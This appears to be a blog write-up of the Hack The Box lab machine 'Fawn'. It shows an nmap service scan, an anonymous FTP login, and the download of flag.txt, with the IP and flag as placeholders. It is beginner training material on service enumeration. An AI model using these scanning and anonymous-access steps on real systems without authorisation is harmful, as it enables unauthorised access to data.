+++
title = "Fawn"
description = "Starting Point machine focused on service enumeration and access through FTP."

platform = "HackTheBox"
OS = "Linux"
difficulty = "Very-Easy"

tags = [
    "FTP",
    "Enumeration",
    "Starting Point"
]

image = "/images/writeups/fawn.png"
+++

### Overview

**Fawn** is a machine from the **Starting Point** path on Hack The Box. It is designed to practice fundamental concepts of reconnaissance, service enumeration, and remote access through FTP.

The objective is to identify the exposed FTP service, determine whether anonymous access is enabled, and use it to access the files available on the system.

---

### Enumeration

We begin by performing an **Nmap** scan to identify the available ports and services:

```bash
nmap -sC -sV <TARGET_IP>
```

The scan shows the following result:

```bash
Starting Nmap 7.95
Nmap scan report for <TARGET_IP>

PORT   STATE SERVICE
21/tcp open  ftp
```

Port `21/tcp` is open and corresponds to the **FTP** service.

Since FTP is commonly used for file transfer, we proceed to investigate whether the service allows access without valid authentication.

---

### Initial Access

We attempt to connect to the FTP service:

```bash
ftp <TARGET_IP>
```

The server requests a username:

```bash
Name: anonymous
```

We use the `anonymous` account, which allows access when anonymous FTP authentication is enabled:

```bash
anonymous
```

The authentication is successful and we gain access to the FTP server:

```bash
230 Login successful.
```

Once inside, we can interact with the files available on the server.

---

### Flag

We list the available files using the `ls` command:

```bash
ls
```

The server contains a file named `flag.txt`:

```bash
flag.txt
```

We use the `get` command to download the flag to our local machine:

```bash
get flag.txt
```

The file is downloaded successfully:

```bash
local: flag.txt remote: flag.txt
```

Finally, we can read its contents:

```bash
cat flag.txt
```

The flag is displayed directly in the terminal:

```text
<FLAG>
```

This completes the **Fawn** machine.

---

### Conclusion

**Fawn** presents a straightforward scenario primarily focused on service enumeration and access through FTP.

The methodology followed was:

```text
Enumeration
    ↓
Port 21 Identification
    ↓
FTP Detection
    ↓
Anonymous Access
    ↓
File Listing
    ↓
Flag Download
```

Despite its **Very Easy** difficulty, the machine reinforces the importance of reviewing exposed services and their authentication mechanisms. In this case, anonymous FTP access allowed us to directly access the files available on the server.

---

### [Status: Completed](https://labs.hackthebox.com/achievement/machine/3933963/393)

